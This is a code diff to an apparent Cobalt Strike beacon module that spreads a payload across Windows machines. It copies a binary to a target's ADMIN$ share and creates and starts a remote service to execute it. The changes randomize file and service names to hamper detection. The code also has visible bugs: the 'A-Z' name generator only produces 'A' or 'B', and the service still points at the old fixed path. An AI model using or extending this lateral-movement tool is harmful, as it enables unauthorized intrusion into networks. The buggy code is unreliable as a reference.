@@ -12,6 +12,29 @@ typedef BOOL(WINAPI *DELETESERVICE)(SC_HANDLE);
 typedef BOOL(WINAPI *CLOSESERVICEHANDLE)(SC_HANDLE);
 typedef DWORD(WINAPI *GETLASTERROR)();
 typedef int(__cdecl *SNPRINTF)(char *, size_t, const char *, ...);
+typedef BOOLEAN (WINAPI* RTLGENRANDOM)(PVOID, ULONG); 
+
+void generateRandomString(char *buffer, int length)
+{
+    // Max length is 256 bytes for now
+    char randomBytes[256];
+
+    // TODO: move to global variables instead
+    RTLGENRANDOM pRtlGenRandom = (RTLGENRANDOM)GetProcAddress(LoadLibraryA("advapi32.dll"), "SystemFunction036");
+    if (!pRtlGenRandom || !pRtlGenRandom(randomBytes, 256))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "RtlGenRandom failed");
+        return;
+    }
+
+    // Convert bytes to A-Z
+    for (int i = 0; i < length; i++)
+    {
+        unsigned char val = randomBytes[i] % 2;
+        buffer[i] = 'A' + val;
+    }
+    buffer[length] = '\0';
+}
 
 void go(char *args, int len)
 {
@@ -59,12 +82,14 @@ void go(char *args, int len)
 
     // 2. Copy local payload to remote ADMIN$ (C:\Windows\Temp.exe)
     CHAR remotePath[MAX_PATH];
-    // TODO: randomize binary name
-    pSnprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$\\Temp.exe", target);
-    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying service binary from %s\n", localPath);
+
+    char binaryName[6];
+    generateRandomString(binaryName, 5);
+    pSnprintf(remotePath, sizeof(remotePath), "\\\\%s\\ADMIN$\\%s.exe", target, binaryName);
+    BeaconPrintf(CALLBACK_OUTPUT, "[+] Copying service binary from %s to %s\n", localPath, remotePath);
 
     if (!pCopyFileA(localPath, remotePath, FALSE))
-    {   // FALSE = overwrite existing
+    { // FALSE = overwrite existing
         // TODO: copyfilea may not work, if path uses non-ASCII letters
         BeaconPrintf(CALLBACK_ERROR, "[X] CopyFileA failed: %lu\n", pGetLastError());
         return;
@@ -72,32 +97,45 @@ void go(char *args, int len)
 
     // 3. Create and start service
     SC_HANDLE hSCM = pOpenSCManagerA(target, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (!hSCM) {
-        BeaconPrintf(CALLBACK_ERROR, "OpenSCManagerA failed: %lu", pGetLastError());
+    if (!hSCM)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[X] OpenSCManagerA failed: %lu", pGetLastError());
         return;
     }
 
-    // // TODO: Randomize service name (or allow it to be supplied somehow)
+    char serviceName[9];
+    char displayName[13];
+
+    generateRandomString(serviceName, 8);
+    generateRandomString(displayName, 12);
+
+    if (!serviceName || !displayName)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[X] Name generation failed");
+        return;
+    }
+
     SC_HANDLE hSvc = pCreateServiceA(
         hSCM,
-        "MySvc",                     // Service name
-        "My Service",                // Display name
+        serviceName, // Service name
+        displayName, // Display name
         SERVICE_ALL_ACCESS,
         SERVICE_WIN32_OWN_PROCESS,
         SERVICE_DEMAND_START,
         SERVICE_ERROR_IGNORE,
-        "C:\\Windows\\Temp.exe",     // Path to payload
-        NULL, NULL, NULL, NULL, NULL
-    );
+        "C:\\Windows\\Temp.exe", // Path to payload
+        NULL, NULL, NULL, NULL, NULL);
 
-    if (!hSvc) {
-        BeaconPrintf(CALLBACK_ERROR, "CreateServiceA failed: %lu", pGetLastError());
+    if (!hSvc)
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[X] CreateServiceA failed: %lu", pGetLastError());
         pCloseServiceHandle(hSCM);
         return;
     }
 
-    if (!pStartServiceA(hSvc, 0, NULL)) {
-        BeaconPrintf(CALLBACK_ERROR, "StartServiceA failed: %lu", pGetLastError());
+    if (!pStartServiceA(hSvc, 0, NULL))
+    {
+        BeaconPrintf(CALLBACK_ERROR, "[X] StartServiceA failed: %lu", pGetLastError());
         pCloseServiceHandle(hSvc);
         pCloseServiceHandle(hSCM);
         return;
